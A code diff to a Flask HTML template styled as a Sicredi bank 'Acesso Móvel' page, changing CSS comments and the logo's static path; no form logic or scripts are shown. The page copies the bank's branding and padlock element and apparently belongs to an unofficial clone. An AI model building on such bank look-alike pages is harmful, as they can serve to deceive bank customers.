@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sicredi - Acesso Móvel</title>
     <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
+    
     <style>
         :root {
             --sicredi-green: #3fa110;
@@ -14,7 +15,7 @@
             --border-gray: #cdd3cd;
         }
 
-        /* Garante que o corpo ocupe toda a altura da tela */
+        /* Estrutura para manter o footer sempre no final */
         html, body { 
             height: 100%; 
             margin: 0; 
@@ -28,12 +29,13 @@
             background-color: var(--bg-gray); 
         }
 
-        /* O wrapper cresce para empurrar o footer */
         .main-wrapper { 
             flex: 1 0 auto; 
         }
 
         header { background-color: #fff; padding: 20px; text-align: center; border-bottom: 4px solid var(--sicredi-green); }
+        
+        /* Ajuste na classe da logo para garantir o tamanho correto */
         .logo-img { max-width: 150px; height: auto; }
         
         .main-container { padding: 20px; max-width: 500px; margin: 0 auto; }
@@ -46,7 +48,7 @@
         
         .btn-primary { background-color: var(--sicredi-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; }
 
-        /* CENTRALIZAÇÃO DO CADEADO */
+        /* Centralização do Cadeado */
         #divBlindagem {
             display: flex;
             justify-content: center;
@@ -55,7 +57,7 @@
             width: 100%;
         }
 
-        /* FOOTER NO FIM DA PÁGINA */
+        /* Footer fixo no rodapé */
         #footer {
             flex-shrink: 0;
             background-color: var(--sicredi-dark-green);
@@ -73,7 +75,7 @@
 
     <div class="main-wrapper">
         <header>
-            <img src="logosicredi-home.jpg" alt="Sicredi" class="logo-img"> 
+            <img src="{{ url_for('static', filename='logosicredi-home.jpg') }}" alt="Sicredi" class="logo-img">
         </header>
 
         <div class="main-container">
